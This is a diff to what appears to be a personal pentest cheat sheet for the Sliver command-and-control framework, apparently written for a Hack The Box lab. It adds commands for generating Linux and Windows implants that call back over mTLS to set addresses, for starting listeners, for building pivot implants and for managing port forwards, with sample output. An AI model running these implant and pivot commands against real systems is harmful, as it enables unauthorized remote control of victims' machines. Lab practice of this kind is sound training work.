@@ -1,5 +1,7 @@
 # Sliver
 
+## Sliver Basics
+
 ### Installation
 
 ```
@@ -177,4 +179,59 @@ getprivs          Get current privileges (Windows only)
 ```
 migrate           Migrate into a remote process
 getprivs          Get current privileges (Windows only)
+```
+
+## Sliver In-Depth
+
+### Generation of implants Quick Paste&#x20;
+
+```
+# linux
+generate -a amd64 --format exe --mtls 10.10.14.4:8080 --name DANTENIX01 --os linux --save /home/ubuntu/Documents/htb/dante/10.10.110.100/implants
+# windows
+generate -a amd64 --format exe --mtls 172.16.1.100:8443 --name DANTE-WS01 --os windows --save /home/ubuntu/Documents/htb/dante/172.16.1.13/implants
+```
+
+### Create Listener Quick Paste
+
+```
+# mtls listener
+mtls -L 10.10.14.2 -l 8080
+# pivot listener 
+pivots tcp -l 3006 --bind 172.16.1.100 -t 300
+```
+
+### Pivots Quick Paste
+
+```
+# linux
+generate --tcp-pivot 172.16.1.100:3006 -a amd64 -o linux -s /home/ubuntu/Documents/htb/dante/172.16.1.100.3006.pivot
+# windows 
+generate --tcp-pivot 172.16.1.100:3006 -a amd64 -o windows -s /home/ubuntu/Documents/htb/dante/172.16.1.100.3006.pivot
+```
+
+### Port Forward Quick Paste
+
+```
+portfwd add -b 60000 -r 127.0.0.1:4444
+
+[*] Port forwarding 127.0.0.1:60000 -> 127.0.0.1:4444
+```
+
+* view current port forwards
+
+```
+portfwd
+
+ ID   Session ID                             Bind Address      Remote Address  
+==== ====================================== ================= =================
+  1   15b59b8a-6954-4230-85e3-5ab927fcedc3   127.0.0.1:4444    127.0.0.1:4444  
+  2   15b59b8a-6954-4230-85e3-5ab927fcedc3   127.0.0.1:1900    127.0.0.1:1900  
+  3   15b59b8a-6954-4230-85e3-5ab927fcedc3   127.0.0.1:50142   127.0.0.1:50142 
+```
+
+* delete a current port forward
+
+```
+portfwd rm -i 2
 ```
